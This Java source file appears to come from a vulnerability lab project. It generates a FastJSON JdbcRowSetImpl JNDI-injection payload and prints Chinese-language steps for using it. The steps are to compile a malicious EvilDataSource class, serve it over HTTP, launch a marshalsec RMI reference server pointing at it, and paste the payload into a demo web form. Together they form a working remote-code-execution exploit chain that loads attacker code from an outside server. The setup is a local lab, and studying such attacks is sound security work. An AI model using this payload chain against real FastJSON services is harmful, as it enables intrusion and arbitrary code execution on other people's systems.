package com.govuln.fastjsonattack;

/**
 * FastJSON JdbcRowSetImpl 攻击客户端（JNDI 注入）
 * 生成基于 JdbcRowSetImpl 的 payload
 * 
 * 注意：此方法需要搭建 JNDI 服务器
 */
public class Client0 {
    public static void main(String[] args) {
        System.out.println("=== FastJSON JdbcRowSetImpl Payload 生成器（JNDI注入） ===\n");
        
        // 默认 RMI 地址（如果 1099 端口被占用，可以使用其他端口，如 1098）
        String rmiUrl = "rmi://127.0.0.1:1098/exp";
        
        // 如果提供了参数，使用参数作为 RMI 地址
        if (args.length > 0) {
            rmiUrl = args[0];
        }
        
        FastJSONJdbcRowSetImpl gadget = new FastJSONJdbcRowSetImpl();
        String payload = gadget.getPayload(rmiUrl);
        
        System.out.println("生成的 Payload：");
        System.out.println(payload);
        System.out.println("\n重要提示：");
        System.out.println("⚠️  JdbcRowSetImpl 在 JDK 8 中可能存在类型转换问题");
        System.out.println("⚠️  如果失败，建议使用 Client（TemplatesImpl 方式）");
        System.out.println("\n使用方法：");
        System.out.println("1. 编译恶意类：");
        System.out.println("   cd fastjsonattack && mvn compile");
        System.out.println("2. 启动 HTTP 服务器（在 classes 目录下）：");
        System.out.println("   cd target/classes");
        System.out.println("   python -m http.server 8087");
        System.out.println("3. 检查端口占用（如果 1099 被占用）：");
        System.out.println("   netstat -ano | findstr :1099");
        System.out.println("   如果被占用，可以：");
        System.out.println("   a) 关闭占用端口的进程");
        System.out.println("   b) 使用其他端口（如 1098），并修改上面的 rmiUrl");
        System.out.println("4. 启动 marshalsec RMI 服务器（使用 EvilDataSource，实现了 DataSource 接口）：");
        System.out.println("   java -cp marshalsec.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8087/#com.govuln.fastjsonattack.EvilDataSource 1099");
        System.out.println("   ⚠️  关键：使用 EvilDataSource 而不是 Evil（EvilDataSource 实现了 DataSource 接口）");
        System.out.println("   ⚠️  关键：URL 中的类名必须是完整包路径 com.govuln.fastjsonattack.EvilDataSource");
        System.out.println("   ⚠️  如果 1099 端口被占用，使用其他端口（如 1098），并修改上面的 rmiUrl");
        System.out.println("5. 将上面的 JSON 数据复制");
        System.out.println("6. 访问 http://localhost:8080/fastjsondemo/");
        System.out.println("7. 在表单中粘贴 JSON 数据并提交");
        System.out.println("\n如果仍然失败，请查看 fastjsonattack/解决方案说明.md");
    }
}


